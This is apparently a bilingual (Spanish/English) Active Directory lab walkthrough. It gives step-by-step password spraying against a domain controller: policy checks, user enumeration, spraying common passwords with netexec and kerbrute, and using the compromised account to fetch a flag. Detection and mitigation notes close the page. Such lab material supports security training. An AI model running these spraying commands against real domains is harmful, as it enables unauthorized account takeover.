Objetivo

La política del dominio no exige complejidad ni bloquea cuentas tras fallos. Rocía una contraseña común contra todos los usuarios del dominio: la cuenta que caiga da acceso a su recurso personal //DC01/jsmith, donde está la flag.

Flag: //{{ ad_dc_host }}/jsmith/flag-ad-03.txt — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Comprobar la política de contraseñas (¿hay bloqueo?)
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --pass-pol

# Rociar una contraseña contra toda la lista de usuarios
nxc smb {{ ad_dc_ip }} -u users.txt -p 'Password123' --continue-on-success

1 · Comprobar la política antes de rociar

Regla de oro del spraying: primero mira el umbral de bloqueo. Si es 0, no hay riesgo de bloquear cuentas.

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --pass-pol

# Salida esperada:
#   Minimum password length: 1
#   Password Complexity Flags: 000000
#   Account Lockout Threshold: None
#   Account Lockout Duration: ...

Lockout Threshold: None → puedes probar tantas contraseñas como quieras.

2 · Preparar la lista de usuarios

Reutiliza la lista del lab AD 02 (enumeración con la credencial svc.readonly por SMB), o vuélvela a generar:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users 2>/dev/null \
  | awk '{print $5}' | grep -vE '^\[|^-Username-$|^$' | sort -u > users.txt
cat users.txt

Nota sobre este Domain Controller: ni nxc ldap --users ni el RID cycling anónimo (nxc smb -u 'guest' -p '' --rid-brute) funcionan contra este DC — el primero falla el bind NTLM por completo, el segundo devuelve STATUS_LOGON_FAILURE/STATUS_ACCESS_DENIED. La enumeración SMB con la credencial svc.readonly (sesión autenticada, no anónima) es la única vía verificada.

3 · Rociar (una contraseña contra muchos usuarios)

Nunca al revés: probar muchas contraseñas contra un usuario es fuerza bruta y bloquea cuentas.

# netexec — el + verde marca los aciertos
nxc smb {{ ad_dc_ip }} -u users.txt -p 'Password123' --continue-on-success

# kerbrute — mucho más rápido y silencioso (habla con el KDC, no con SMB)
kerbrute passwordspray -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} users.txt 'Password123'

# Varias contraseñas de temporada, una pasada por cada una
for p in 'Password123' 'Welcome1' 'Autumn2023!' 'Summer2024!'; do
  nxc smb {{ ad_dc_ip }} -u users.txt -p "$p" --continue-on-success | grep '\[+\]'
done

Resultado:

SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [+] {{ ad_realm_lower }}\j.smith:Password123

4 · Usar la credencial y capturar la flag

# ¿A qué recursos llega j.smith?
nxc smb {{ ad_dc_ip }} -u 'j.smith' -p 'Password123' --shares

smbclient //{{ ad_dc_ip }}/jsmith -U '{{ ad_domain }}\j.smith%Password123' -c 'get flag-ad-03.txt -'

5 · Detección

Un spray deja un patrón muy reconocible: muchos eventos 4625 (fallo de autenticación) con distintos usuarios y la misma IP origen en una ventana corta de tiempo.

Mitigación

  • Umbral de bloqueo razonable (p. ej. 5 intentos / 15 min) y smart lockout.
  • Prohibir contraseñas comunes con una lista negra (Azure AD Password Protection o equivalente).
  • MFA en todo acceso remoto y alertas por picos de 4625 con usuarios distintos.

Herramientas

netexec (nxc) kerbrute smbclient spray

1 · Check the policy before spraying

Golden rule of spraying: look at the lockout threshold first. If it is 0, you cannot lock anyone out.

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --pass-pol

# Expected output:
#   Minimum password length: 1
#   Password Complexity Flags: 000000
#   Account Lockout Threshold: None
#   Account Lockout Duration: ...

Lockout Threshold: None → you can try as many passwords as you like.

2 · Build the user list

Reuse the list from lab AD 02 (SMB enumeration with the svc.readonly credential), or regenerate it:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users 2>/dev/null \
  | awk '{print $5}' | grep -vE '^\[|^-Username-$|^$' | sort -u > users.txt
cat users.txt

Note about this Domain Controller: neither nxc ldap --users nor anonymous RID cycling (nxc smb -u 'guest' -p '' --rid-brute) work against this DC — the first fails the NTLM bind entirely, the second returns STATUS_LOGON_FAILURE/STATUS_ACCESS_DENIED. SMB enumeration with the svc.readonly credential (an authenticated session, not anonymous) is the only verified path.

3 · Spray (one password against many users)

Never the other way round: many passwords against one user is brute force and locks accounts out.

# netexec — the green + marks the hits
nxc smb {{ ad_dc_ip }} -u users.txt -p 'Password123' --continue-on-success

# kerbrute — far faster and quieter (talks to the KDC, not SMB)
kerbrute passwordspray -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} users.txt 'Password123'

# Several seasonal passwords, one pass each
for p in 'Password123' 'Welcome1' 'Autumn2023!' 'Summer2024!'; do
  nxc smb {{ ad_dc_ip }} -u users.txt -p "$p" --continue-on-success | grep '\[+\]'
done

Result:

SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [+] {{ ad_realm_lower }}\j.smith:Password123

5 · Detection

A spray leaves a very recognisable pattern: many 4625 events (failed logon) with different usernames from the same source IP in a short time window.

Mitigation

  • A sane lockout threshold (e.g. 5 attempts / 15 min) plus smart lockout.
  • Ban common passwords with a blocklist (Azure AD Password Protection or equivalent).
  • MFA on every remote access path and alerts on 4625 spikes across distinct users.

Tools

netexec (nxc) kerbrute smbclient spray
